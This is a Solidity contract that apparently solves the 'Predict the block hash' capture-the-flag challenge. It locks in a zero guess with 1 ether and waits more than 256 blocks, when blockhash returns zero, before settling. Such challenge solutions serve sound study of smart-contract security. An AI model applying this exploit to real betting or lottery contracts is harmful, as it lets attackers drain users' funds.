pragma solidity ^0.4.21;

import "./LotteryAux.sol";

contract PredictTheBlockHashChallenge {
    function lockInGuess(bytes32) public payable {}
    
    function settle() public {}
}

contract Aux is LotteryAux {
    uint myBlock;
    bytes32 luckyHash = 0x00000000000000000000000000000000;
    
    PredictTheBlockHashChallenge pthc = PredictTheBlockHashChallenge(0x1815c803407C37b6e30990B4713b1c2D768AFcb6);
    
    function play() public payable {
        pthc.lockInGuess.value(1 ether)(luckyHash);
        myBlock = block.number + 1;
    }
    
    function counter() public view returns(uint) {
        return block.number - myBlock;
    }
    
    function win() public {
        require(block.number - myBlock > 256);
        pthc.settle();
    }
    
}
